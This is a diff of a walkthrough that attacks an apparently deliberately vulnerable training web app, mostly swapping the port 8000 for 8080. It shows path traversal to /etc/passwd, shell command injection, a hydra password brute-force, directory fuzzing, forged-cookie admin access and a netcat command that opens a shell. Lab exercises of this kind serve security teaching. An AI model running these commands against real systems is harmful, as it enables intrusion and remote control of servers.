@@ -59,7 +59,7 @@ a07bda8fd5e39462b4c3d860a36f6b4d
 
 The About Us page clearly displays the contents of text files that are on the server. When you click on one of them, the URL looks like this:
 
-[http://0.0.0.0:8000/about?doc=termo_de_uso](http://0.0.0.0:8000/about?doc=termo_de_uso)
+[http://0.0.0.0:8080/about?doc=termo_de_uso](http://0.0.0.0:8080/about?doc=termo_de_uso)
 
 Let's explore:
 
@@ -68,9 +68,9 @@ Let's explore:
 
 Probably not see anything because this field receives the file name and does prepend a path and append an extension. Therefore, term_user should become something like /folder/user.txt. If this is true, we can test with relative directories + null bytes and also with multiple file names.
 
-- [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00)  Breaks with null byte.
-- [http://0.0.0.0:8000/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://0.0.0.0:8000/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) displays all files but the first and the last.
-- Does it in this context pass the path to the shell? If so, we can try to embed and execute commands ... [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Oh, dear! Game over.
+- [http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%00](http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%00)  Breaks with null byte.
+- [http://0.0.0.0:8080/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://0.0.0.0:8080/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) displays all files but the first and the last.
+- Does it in this context pass the path to the shell? If so, we can try to embed and execute commands ... [http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://0.0.0.0:8080/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Oh, dear! Game over.
 
 ### Contact us: CSRF + XSS (Firefox)
 
@@ -91,7 +91,7 @@ When you create a user, you can upload any file other than a photo to the server
 With THC-Hydra, Burp Suite or OWASP ZAP you can easily crack passwords, as there is no time limiter after wrong attempts.
 
 ```
-hydra -V -s 8000 \
+hydra -V -s 8080 \
     -l admin -P /opt/wordlists/common_it_passwords.txt \
     0.0.0.0 \
     http-post-form \
@@ -119,7 +119,7 @@ By updating the cookie and refreshing, session privileges are instantly increase
 
 Since there is no feature that prevents multiple sequential requests, tools such as DIRB, Nikto and ZAP can fuzzy or do list attacks to find hidden directories.
 
-`dirb http://0.0.0.0:8000/`
+`dirb http://0.0.0.0:8080/`
 
 Found `/status` hidden.
 
@@ -129,7 +129,7 @@ The `/status` directory only allows the execution of certain commands, and only 
 
 ```
 curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
-    'http://0.0.0.0:8000/status' \
+    'http://0.0.0.0:8080/status' \
     -X POST \
     --data 'cmd=env'
 ```
@@ -138,7 +138,7 @@ To raise a reverse shell if the server has Netcat installed:
 
 ```
 curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
-    'http://0.0.0.0:8000/status' \
+    'http://0.0.0.0:8080/status' \
     -X POST \
     --data 'cmd=nc -lvp 8443 -e /bin/bash'
 ```
